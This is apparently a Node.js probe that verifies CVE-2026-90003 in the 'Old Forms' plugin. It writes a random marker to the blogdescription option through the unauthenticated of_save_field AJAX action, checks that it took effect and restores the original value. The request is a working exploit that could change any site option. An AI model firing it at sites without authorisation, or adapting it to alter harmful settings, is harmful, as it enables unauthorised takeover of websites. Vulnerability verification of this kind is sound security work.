// probe.mjs - verifies CVE-2026-90003 (Old Forms <= 1.4.2):
// unauthenticated arbitrary option write via the nopriv `of_save_field` AJAX action.
//
// Usage: node probe.mjs <base-url>   e.g. node probe.mjs http://127.0.0.1:8189
// Exit codes: 0 = vulnerable, 1 = not vulnerable (appears fixed),
//             2 = probe could not reach a decision (network/parse error).
//
// Method: read the current `blogdescription` option (public REST index), write a random
// marker to it through of_save_field, confirm the marker is visible, then restore the
// original value. Only the base URL's origin is contacted. No filesystem access.

import { randomBytes } from 'node:crypto';

const EXIT_VULNERABLE = 0;
const EXIT_NOT_VULNERABLE = 1;
const EXIT_INDETERMINATE = 2;
const TIMEOUT_MS = 10000;

function fail(msg) {
  console.error(`[probe] ${msg}`);
  process.exit(EXIT_INDETERMINATE);
}

const rawBase = process.argv[2];
if (!rawBase) fail('usage: node probe.mjs <base-url>');

let origin;
try {
  const u = new URL(rawBase);
  if (u.protocol !== 'http:' && u.protocol !== 'https:') fail('base URL must be http(s)');
  origin = u.origin; // only this origin is ever contacted
} catch {
  fail('invalid base URL');
}

const REST_URL = `${origin}/index.php?rest_route=/`;
const AJAX_URL = `${origin}/wp-admin/admin-ajax.php`;

async function getDescription() {
  const res = await fetch(REST_URL, { redirect: 'manual', signal: AbortSignal.timeout(TIMEOUT_MS) });
  if (!res.ok) throw new Error(`REST index returned HTTP ${res.status}`);
  const json = await res.json();
  if (typeof json.description !== 'string') throw new Error('REST index has no description field');
  return json.description;
}

async function saveField(key, value) {
  const res = await fetch(AJAX_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({ action: 'of_save_field', key, value }),
    redirect: 'manual',
    signal: AbortSignal.timeout(TIMEOUT_MS),
  });
  const text = await res.text();
  let json = null;
  try { json = JSON.parse(text); } catch { /* non-JSON response */ }
  return { status: res.status, ok: json !== null && json.success === true };
}

let original;
try {
  original = await getDescription();
} catch (err) {
  fail(`could not read baseline option: ${err.message}`);
}

const marker = `probe-${randomBytes(8).toString('hex')}`;
let vulnerable = false;
let writeAccepted = false;
let probeError = null;

try {
  const w = await saveField('blogdescription', marker);
  writeAccepted = w.ok;
  if (w.ok) {
    const seen = await getDescription();
    vulnerable = seen === marker;
    console.log(`[probe] unauthenticated write ${vulnerable ? 'took effect' : 'did NOT take effect'}`);
  } else {
    console.log(`[probe] of_save_field returned HTTP ${w.status} without success:true (write rejected)`);
  }
} catch (err) {
  probeError = err.message;
} finally {
  // Restore the original option value whenever a write was accepted, regardless of outcome.
  if (writeAccepted) {
    try {
      const r = await saveField('blogdescription', original);
      const restored = r.ok ? await getDescription() : null;
      if (restored === original) {
        console.log('[probe] original blogdescription restored');
      } else {
        console.error('[probe] WARNING: could not confirm restore of blogdescription');
      }
    } catch (err) {
      console.error(`[probe] WARNING: restore failed: ${err.message}`);
    }
  }
}

if (vulnerable) {
  console.log('[probe] RESULT: VULNERABLE');
  process.exit(EXIT_VULNERABLE);
}
if (probeError !== null) {
  // Network/parse failure mid-probe: no decision, so don't report "not vulnerable".
  fail(`probe error during write/verify: ${probeError}`);
}
console.log('[probe] RESULT: NOT VULNERABLE');
process.exit(EXIT_NOT_VULNERABLE);
